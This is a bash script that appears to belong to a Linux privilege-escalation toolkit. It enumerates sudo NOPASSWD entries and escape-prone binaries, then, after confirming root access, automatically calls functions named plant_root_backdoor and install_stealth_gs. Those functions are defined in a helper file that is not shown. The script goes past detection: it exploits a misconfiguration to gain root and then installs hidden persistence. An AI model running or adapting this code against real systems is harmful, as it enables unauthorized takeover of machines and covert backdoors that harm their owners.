#!/bin/bash
source "$(dirname "$0")/00_common.sh"

info "Checking sudo misconfigurations..."

# Check if sudo exists
if ! command -v sudo >/dev/null 2>&1; then
    fail "sudo not installed"
    exit 0
fi

# Check sudo -l WITHOUT prompting for password
# Use -n (non-interactive) to avoid password prompt
sudo_output=$(sudo -n -l 2>/dev/null)

if [ -z "$sudo_output" ]; then
    # Try without -n but with timeout to avoid hanging
    sudo_output=$(timeout 1 sudo -l 2>/dev/null)
fi

if [ -z "$sudo_output" ]; then
    fail "Cannot check sudo (password required)"
    exit 0
fi

# Check for NOPASSWD
if echo "$sudo_output" | grep -qi "NOPASSWD"; then
    success "NOPASSWD entries found!"
    echo "$sudo_output" | grep -i "NOPASSWD"
    
    # Check for dangerous commands
    for cmd in /bin/bash /bin/sh /usr/bin/python /usr/bin/perl /usr/bin/ruby /usr/bin/vim /usr/bin/less /usr/bin/more /usr/bin/awk /usr/bin/find /usr/bin/nmap; do
        if echo "$sudo_output" | grep -q "$cmd"; then
            success "VULNERABLE: $cmd with NOPASSWD!"
            warn "Try: sudo $cmd"
        fi
    done
    
    # Check for ALL
    if echo "$sudo_output" | grep -qE "ALL.*NOPASSWD.*ALL|NOPASSWD.*ALL"; then
        success "CRITICAL: ALL commands with NOPASSWD!"
        warn "You can run: sudo su"
        
        # Try to get root
        if sudo -n su -c "id" 2>/dev/null | grep -q "uid=0"; then
            success "ROOT ACCESS CONFIRMED!"
            sudo -n su -c "$(declare -f is_root plant_root_backdoor install_stealth_gs success warn); plant_root_backdoor" 2>/dev/null
        fi
    fi
else
    fail "No sudo NOPASSWD found"
fi

# Show all sudo privileges anyway
info "Current sudo privileges:"
echo "$sudo_output" | head -20
